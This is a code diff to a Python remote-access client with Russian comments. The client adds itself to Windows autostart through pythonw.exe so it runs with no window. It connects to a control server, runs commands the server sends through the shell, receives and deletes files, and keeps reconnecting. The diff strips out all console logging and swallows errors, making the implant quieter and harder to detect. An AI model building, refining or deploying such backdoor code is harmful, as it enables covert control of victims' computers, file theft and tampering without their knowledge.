@@ -32,6 +32,7 @@ def add_to_autostart_windows():
     try:
         exe_path = sys.executable
         script_path = os.path.abspath(__file__)
+        # Для корректной работы на Windows используем pythonw.exe если доступен
         if exe_path.lower().endswith("python.exe"):
             pythonw_path = exe_path[:-4] + "w.exe"
             if os.path.exists(pythonw_path):
@@ -152,9 +153,7 @@ def main():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             s.connect((SERVER_IP, SERVER_PORT))
-            print(f"[INFO] Подключились к серверу {SERVER_IP}:{SERVER_PORT}")
         except Exception:
-            print("[WARN] Не удалось подключиться к серверу. Пауза 5 секунд...")
             time.sleep(5)
             continue
 
@@ -162,19 +161,17 @@ def main():
             while True:
                 data = s.recv(BUFFER_SIZE)
                 if not data:
-                    print("[INFO] Поток данных от сервера завершен")
                     break
                 command = data.decode(errors='ignore')
                 if not command:
                     break
                 if command == "exit":
-                    print("[INFO] Получена команда выхода")
                     break
 
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
-                    # Обработка nohup без ожидания
+                    # Специальная обработка команд, содержащих nohup (запуск без ожидания)
                     if "nohup" in cmd:
                         try:
                             subprocess.Popen(cmd, shell=True,
@@ -185,7 +182,7 @@ def main():
                             s.send(f"Ошибка запуска команды с nohup: {e}".encode())
                         continue
 
-                    # Запуск команд в фоне (&)
+                    # Обработка команд с & в конце (фоновые команды)
                     if cmd.endswith('&'):
                         cmd_no_amp = cmd.rstrip('&').strip()
                         try:
@@ -290,12 +287,9 @@ def main():
                                 if chunk == b"__file_transfer_end__" or not chunk:
                                     break
                                 f.write(chunk)
-                        # Отправляем подтверждение успешного получения файла
                         s.send(f"Файл {os.path.basename(filepath)} успешно получен.".encode())
-                        print(f"[INFO] Файл {filepath} успешно сохранён")
                     except Exception as e:
                         s.send(f"Ошибка при сохранении файла: {e}".encode())
-                        print(f"[ERROR] Ошибка при сохранении файла: {e}")
 
                 elif command.startswith("delete:"):
                     filepath = command[len("delete:"):].strip()
@@ -308,8 +302,8 @@ def main():
                 else:
                     s.send("Неизвестная команда".encode())
 
-        except Exception as e:
-            print(f"[ERROR] Ошибка в основном цикле: {e}")
+        except Exception:
+            pass
         finally:
             s.close()
 
